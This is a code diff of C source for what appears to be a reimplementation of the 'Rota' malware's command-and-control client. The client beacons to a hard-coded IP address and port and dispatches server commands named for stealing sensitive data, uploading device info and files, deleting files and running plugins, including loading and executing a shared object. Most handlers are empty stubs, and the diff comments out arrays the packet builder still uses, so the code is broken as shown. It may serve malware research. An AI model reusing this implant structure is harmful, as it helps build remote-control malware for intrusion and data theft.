@@ -13,48 +13,41 @@
 
 // https://gist.github.com/suyash/2488ff6996c98a8ee3a84fe3198a6f85
 void c2_loop(){
-    int sleepy_time = 3;
-	int sock;
-    const char* server_name = "10.10.2.186";
+
+    int sleepy_time = 3; // default C2 sleep time
+    int sock;
+    const char* server_name = "10.10.2.228";
     const int server_port = 1443;
 
-    char *initial_pkt = initial_rota_pkt();
-
-    while (1) {
-        printf("(%d) In c2 loop...\n", getpid());
-        struct sockaddr_in server_address;
-
-        memset(&server_address, 0, sizeof(server_address));
-        server_address.sin_family = AF_INET;
-
-    // creates binary representation of server name
-	// and stores it as sin_addr
-	// http://beej.us/guide/bgnet/output/html/multipage/inet_ntopman.html
+    // setup sockets for initial packet
+    struct sockaddr_in server_address;
+    memset(&server_address, 0, sizeof(server_address));
+    server_address.sin_family = AF_INET;
     inet_pton(AF_INET, server_name, &server_address.sin_addr);
-
-    // htons: port in network order format
     server_address.sin_port = htons(server_port);
 
-	// open a stream socket
-	if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
-		fprintf(stderr, "could not create socket\n");
-	}
-
+    // on failure of connect/socket create, sleep and recrusively call ourselves.
+    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
+        fprintf(stderr, "could not create socket\n");
+        sleep(3);
+        c2_loop();
+    }
     if (connect(sock, (struct sockaddr*)&server_address, sizeof(server_address)) < 0) {
         fprintf(stderr, "could not connect to server\n");
         sleep(3);
         c2_loop();
     }
 
-	// send
-	// data that will be sent to the server
+    char *initial_pkt = initial_rota_pkt();
 	send(sock, initial_pkt, 82, 0);
 
-	// receive
+    while (1) {
+        printf("(%d) In c2 loop...\n", getpid());
 
-    int n = 0;
-    int len = 0, maxlen = 4096;
-    char buffer[maxlen];
+        // receive
+        int n = 0;
+        int len = 0, maxlen = 4096;
+        char buffer[maxlen];
 
 	// will remain open until the server terminates the connection
     while ((n = recv(sock, buffer, maxlen, 0)) > 0) {
@@ -62,58 +55,88 @@ void c2_loop(){
         maxlen -= n;
         len += n;
 
-        printf("Data Received: %s\n", buffer);
+        printf("Data received: %s\n", buffer);
 
         unsigned char cmd_id[4];
 
         // exit ==> 0x13 0x8E 0x3E 0x06
         if (memcmp(&rota_c2_exit, cmd_id, 4) == 0) {
+            #ifdef DEBUG
+            printf("[+] Rota C2 Run exiting!");
+            #endif
+
             char *msg = "exiting!";
             send(sock, msg, strlen(msg), 0);
             c2_exit();
         }
         // perform a "PING"/"PONG" connectivity test
         else if (memcmp(&rota_c2_test, cmd_id, 4) == 0) {
+            #ifdef DEBUG
+            printf("[+] Rota C2 ping/png!");
+            #endif
 
         }
         else if (memcmp(&rota_c2_heartbeat, cmd_id, 4) == 0) {
+            #ifdef DEBUG
+            printf("[+] Rota C2 heartbeat!");
+            #endif
 
         }
         else if (memcmp(&rota_c2_set_timeout, cmd_id, 4) == 0) {
-            // TODO parse payload and update second parameter with new time.
-            // having 10 seconds as a place holder for now.
-            c2_set_timeout(&sleepy_time, 10);
-        }
-        else if (memcmp(&rota_c2_set_timeout, cmd_id, 4) == 0) {
+            #ifdef DEBUG
+            printf("[+] Rota C2 set timeout!");
+            #endif
             // TODO parse payload and update second parameter with new time.
             // having 10 seconds as a place holder for now.
             c2_set_timeout(&sleepy_time, 10);
         }
         else if (memcmp(&rota_c2_steal_data, cmd_id, 4) == 0) {
+            #ifdef DEBUG
+            printf("[+] Rota C2 Run steal sensitive data\n");
+            #endif
 
         }
         else if (memcmp(&rota_c2_upload_dev_info, cmd_id, 4) == 0) {
+            #ifdef DEBUG
+            printf("[+] Rota C2 Run upload dev info\n");
+            #endif
 
         }
         else if (memcmp(&rota_c2_upload_file, cmd_id, 4) == 0) {
+            #ifdef DEBUG
+            printf("[+] Rota C2 Run upload\n");
+            #endif
 
         }
         else if (memcmp(&rota_c2_query_file, cmd_id, 4) == 0) {
+            #ifdef DEBUG
+            printf("[+] Rota C2 Run query file\n");
+            #endif
 
         }
         else if (memcmp(&rota_c2_delete_file, cmd_id, 4) == 0) {
+            #ifdef DEBUG
+            printf("[+] Rota C2 Run delete file\n");
+            #endif
 
         }
         else if (memcmp(&rota_c2_run_plugin_1, cmd_id, 4) == 0) {
-
+            #ifdef DEBUG
+            printf("[+] Rota C2 Run Plugin 1\n");
+            #endif
         }
         else if (memcmp(&rota_c2_run_plugin_2, cmd_id, 4) == 0) {
+            #ifdef DEBUG
+            printf("[+] Rota C2 Run Plugin 2\n");
+            #endif
 
         }
         else if (memcmp(&rota_c2_run_plugin_3, cmd_id, 4) == 0) {
+            #ifdef DEBUG
+            printf("[+] Rota C2 Run Plugin 3\n");
+            #endif
 
         }
-
 
         sleep(sleepy_time);
         memset(buffer, 0, strlen(buffer));
@@ -205,7 +228,6 @@ void c2_run_plugin_1(char *soPath, char *funcName) {
 
     // execution of shared object
     func_ptr();
-
     dlclose(handle);
 }
 
@@ -215,25 +237,25 @@ char *initial_rota_pkt() {
     char *rotaHdr = (char *)malloc(82);
     memset(rotaHdr, 0, 82);
 
-    char magicBytes[] = {0x3B, 0x91, 0x01, 0x10};
+    //char magicBytes[] = {0x3B, 0x91, 0x01, 0x10};
     memcpy(rotaHdr, magicBytes, sizeof(magicBytes));
 
-    char payloadLen[] = {0x0f};
+    ///char payloadLen[] = {0x0f};
     memcpy(&rotaHdr[4], payloadLen, sizeof(payloadLen));
 
-    char marker_1[] = {0xe9, 0xbb, 0x91};
+    //char marker_1[] = {0xe9, 0xbb, 0x91};
     memcpy(&rotaHdr[19], marker_1, sizeof(marker_1));
 
-    char marker_2[] = {0xe5, 0xae, 0xa2};
+    //char marker_2[] = {0xe5, 0xae, 0xa2};
     memcpy(&rotaHdr[24], marker_2, sizeof(marker_2));
 
-    char cmd_id[] = {0x13, 0x37};
+    //char cmd_id[] = {0x13, 0x37};
     memcpy(&rotaHdr[27], cmd_id, sizeof(cmd_id));
 
-    char marker_3[] = {0xe9, 0xbb, 0x91};
+    //char marker_3[] = {0xe9, 0xbb, 0x91};
     memcpy(&rotaHdr[66], marker_3, sizeof(marker_3));
 
-    char marker_4[] = {0x39,0x00};
+    //char marker_4[] = {0x39,0x00};
     memcpy(&rotaHdr[77], marker_4, sizeof(marker_4));
 
     return rotaHdr;
